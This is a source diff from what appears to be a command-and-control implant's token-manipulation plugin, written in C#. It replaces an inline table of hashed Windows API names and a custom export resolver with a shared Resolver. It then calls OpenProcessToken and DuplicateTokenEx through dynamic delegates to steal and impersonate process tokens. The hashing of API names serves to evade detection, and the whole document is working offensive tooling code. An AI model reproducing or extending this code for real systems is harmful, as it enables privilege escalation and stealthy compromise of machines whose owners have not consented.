@@ -19,62 +19,27 @@ namespace Agent
         private delegate bool openProcTokenDelegate(IntPtr ProcessHandle, uint desiredAccess, out SafeAccessTokenHandle TokenHandle);
         private delegate bool dupeTokenDelegate(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, Native.TOKEN_TYPE TokenType, out SafeAccessTokenHandle phNewToken);
         private delegate bool closeHandleDelegate(IntPtr hObject);
-        private long key = 0x617468656E61;
-        private bool resolved = false;
-        Dictionary<string, string> map = new Dictionary<string, string>()
-        {
-            { "ada","913D4B11CDB00C2A4496782D97EF10EE" },
-            { "lgu","38E3C832D929A0FAAAF6D58E8B2A1641" },
-            { "opt","FC4C07508BF0023D72BF05F30D8A54A0" },
-            { "dte","D16B373A40378BEA7C6E917480D4DF6E" },
-            { "ch","A009186409957CF0C8AB5FD6D5451A25" },
-        };
-        private IntPtr luFunc = IntPtr.Zero;
-        private IntPtr optFunc = IntPtr.Zero;
-        private IntPtr dteFunc = IntPtr.Zero;
         public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
         {
             this.messageManager = messageManager;
             this.tokenManager = tokenManager;
         }
 
-        private bool Resolve()
-        {
-            Console.WriteLine("AdvancedAPI");
-            var adaMod = Generic.GetLoadedModulePtr(map["ada"], key);
-
-            if(adaMod == IntPtr.Zero)
-            {
-                resolved = false;
-                return false;
-            }
-            Console.WriteLine("LogonUser");
-            this.luFunc = Generic.GetExportAddr(adaMod, map["lgu"], key);
-            Console.WriteLine("DuplicateTokenEx");
-            this.dteFunc = Generic.GetExportAddr(adaMod, map["dte"], key);
-            Console.WriteLine("OpenProcessToken");
-            this.optFunc = Generic.GetExportAddr(adaMod, map["opt"], key);
-
-            if(luFunc == IntPtr.Zero || dteFunc == IntPtr.Zero || optFunc == IntPtr.Zero)
-            {
-                return false;
-            }
-
-            resolved = true;
-            return true;
-        }
-
         public async Task Execute(ServerJob job)
         {
             Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
-
-            if (!resolved)
+            List<string> funcs = new List<string>()
             {
-                if (!this.Resolve())
-                {
-                    await messageManager.WriteLine("Failed to get exports", job.task.id, true, "error");
-                    return;
-                }
+                "lgu",
+                "opt",
+                "dte",
+                "ch"
+            };
+
+            if(!Resolver.ResolveFuncs(funcs, "aa32"))
+            {
+                await messageManager.WriteLine("Failed to get exports", job.task.id, true, "error");
+                return;
             }
 
             switch(args["action"].ToLower())
@@ -178,7 +143,7 @@ namespace Agent
 
                     object[] optParams = new object[] { procHandle.DangerousGetHandle(), (uint)TokenAccessLevels.MaximumAllowed, hToken};
 
-                    bool result = Generic.InvokeFunc<bool>(optFunc, typeof(openProcTokenDelegate), ref optParams);
+                    bool result = Generic.InvokeFunc<bool>(Resolver.GetFunc("opt"), typeof(openProcTokenDelegate), ref optParams);
 
                     if (!result)
                     {
@@ -195,7 +160,7 @@ namespace Agent
                     hToken = (SafeAccessTokenHandle)optParams[2];
                     object[] dtParams = new object[] { hToken.DangerousGetHandle(), (uint)TokenAccessLevels.MaximumAllowed, IntPtr.Zero, (uint)TokenImpersonationLevel.Impersonation, Native.TOKEN_TYPE.TokenImpersonation, dupHandle };
 
-                    result = Generic.InvokeFunc<bool>(dteFunc, typeof(dupeTokenDelegate), ref dtParams);
+                    result = Generic.InvokeFunc<bool>(Resolver.GetFunc("dte"), typeof(dupeTokenDelegate), ref dtParams);
 
                     if (!result)
                     {
